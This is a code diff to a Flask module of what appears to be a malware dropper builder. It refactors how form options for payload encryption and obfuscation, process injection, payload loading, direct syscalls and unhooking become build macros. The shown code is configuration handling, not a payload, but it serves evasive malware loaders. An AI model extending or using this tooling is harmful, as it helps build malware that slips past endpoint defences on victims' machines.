@@ -1,8 +1,17 @@
+import ast
 import math
 from flask import request
 from collections import Counter
 
 from dropper_builder.shellcode_generator import obfuscation_algorithms
+
+PREPROCESSING_KEYS = [
+    "encryption & obfuscation",
+    "injection",
+    "payload_loading",
+    "syscalls",
+    "unhooking",
+]
 
 def extract_shellcode(shellcode: str, type: str):
     if type == 'exe':
@@ -36,35 +45,29 @@ def compute_pe_file_entropy(file_path):
 def extract_form_data():
     form_data = {}
     for key, value in request.form.items():
-        form_data[key] = value
-    print(form_data)
+        try:
+            form_data[key] = ast.literal_eval(value) if value else None
+        except (ValueError, SyntaxError):
+            form_data[key] = value
     return form_data
 
 def process_dropper_config(dropper_config):
     dropper_config['preprocessing_macros'] = []
-
-    encryption_method = dropper_config.get('encryption & obfuscation', '').replace(' ', '_').upper()
-    if encryption_method:
-        dropper_config['preprocessing_macros'].append(encryption_method)
-        if encryption_method.split('_')[0].lower() in obfuscation_algorithms:
-            dropper_config['preprocessing_macros'].append("OBFUSCATED_PAYLOAD")
+    
+    for key in dropper_config:
+        if not key in PREPROCESSING_KEYS or dropper_config[key] == None:
+            continue
+        
+        value = dropper_config.get(key, "")
+        if isinstance(value, list):
+            dropper_config['preprocessing_macros'].extend([v for v in value if v.strip()])
+        elif isinstance(value, str):
+            dropper_config['preprocessing_macros'].append(value.strip())
         else:
-            dropper_config['preprocessing_macros'].append("ENCRYPTED_PAYLOAD")
-    if dropper_config.get('injection'):
-        dropper_config['preprocessing_macros'].append(dropper_config.get('injection').replace(' ', '_').upper())
-    if 'anti_analysis' in dropper_config:
-        dropper_config['preprocessing_macros'].append("ANTI_ANALYSIS_ENABLED")
-    if dropper_config.get('debug'):
+            dropper_config['preprocessing_macros'].append(value)
+    if dropper_config.get("debug"):
         dropper_config['preprocessing_macros'].append("DEBUG")
-    if len(request.form.getlist('process_name')) > 0 and request.form.getlist('process_name')[0] != '':
-        dropper_config['preprocessing_macros'].append("PROCESS_NAME_ENABLED")
-    if dropper_config.get('syscalls'):
-        dropper_config['preprocessing_macros'].append(dropper_config.get('syscalls').replace(' ', '_').upper())
-        dropper_config['preprocessing_macros'].append("SYSCALL_ENABLED")
-    if dropper_config.get('unhooking'):
-        dropper_config['preprocessing_macros'].append(dropper_config.get('unhooking').replace(' ', '_').upper())
-        dropper_config['preprocessing_macros'].append("UNHOOKING_ENABLED")
-
+    
     dropper_config['hide_console'] = dropper_config.get('hide_console')
 
     process_names = [p_name for p_name in request.form.getlist('process_name') if p_name.strip()]
